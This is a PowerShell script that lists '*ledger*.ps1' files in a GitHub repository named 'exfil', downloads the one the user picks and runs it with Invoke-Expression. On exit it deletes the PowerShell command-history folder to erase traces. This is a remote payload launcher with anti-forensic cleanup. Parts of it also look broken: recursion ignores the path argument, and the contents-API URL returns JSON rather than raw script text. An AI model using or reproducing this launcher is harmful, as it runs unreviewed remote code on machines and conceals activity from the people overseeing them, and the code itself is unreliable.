# Set TLS to handle different versions
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol
}

# Define your repo repository details
$owner = "sempiampi"
$repo = "exfil"

# Get the contents of a directory in the repository
function Get-repoRepoContents {
    param (
        [string]$owner,
        [string]$repo,
        [string]$path = ""
    )

    $uri = "https://api.github.com/repos/$owner/$repo/contents"
    $response = Invoke-RestMethod -Uri $uri
    $contents = @()

    foreach ($item in $response) {
        if ($item.type -eq "dir") {
            $contents += Get-repoRepoContents -owner $owner -repo $repo -path $item.path
        } elseif ($item.type -eq "file" -and $item.name -like "*ledger*.ps1") {
            $contents += "https://api.github.com/repos/$owner/$repo/contents/$($item.path)"
        }
    }
    return $contents
}

# Get the contents of the entire repository
$actions = Get-repoRepoContents -owner $owner -repo $repo

while ($true) {
    Write-Host "-------------------------------------------------------------" -ForegroundColor Yellow -BackgroundColor Black
    
    $index = 1
    foreach ($actionUrl in $actions) {
        $fileName = [System.IO.Path]::GetFileName($actionUrl)
        Write-Host "$index. $fileName"
        $index++
    }
    $selectedActionIndex = $(Write-Host "Enter the number or type 'q' to quit: " -ForegroundColor Yellow -BackgroundColor Black -NoNewline; Read-Host)
    if ($selectedActionIndex -eq 'q') {
        Write-Host "Exiting..." -ForegroundColor Red
        # Add code to clear PSReadLine history
        $psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
        if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
            $files = Get-ChildItem -Path $psreadlineFolderPath
            if ($files.Count -gt 0) {
                Remove-Item -Path "$psreadlineFolderPath\*" -Force
            }
        }
        break
    }
    $selectedActionIndex = [int]$selectedActionIndex  # Cast input to an integer
    if ($selectedActionIndex -ge 1 -and $selectedActionIndex -le $actions.Count) {
        $selectedUrl = $actions[$selectedActionIndex - 1]
        $selectedAction = [System.IO.Path]::GetFileNameWithoutExtension($selectedUrl)
        Write-Host "You chose: $selectedAction" -ForegroundColor Green -BackgroundColor Black
        
        $urlContent = (Invoke-WebRequest -Uri $selectedUrl -UseBasicParsing).Content
        Invoke-Expression $urlContent
    }
    else {
        Write-Host "Invalid selection. Please choose a valid number or type 'q' to quit: " -ForegroundColor Red -BackgroundColor Black
    }
}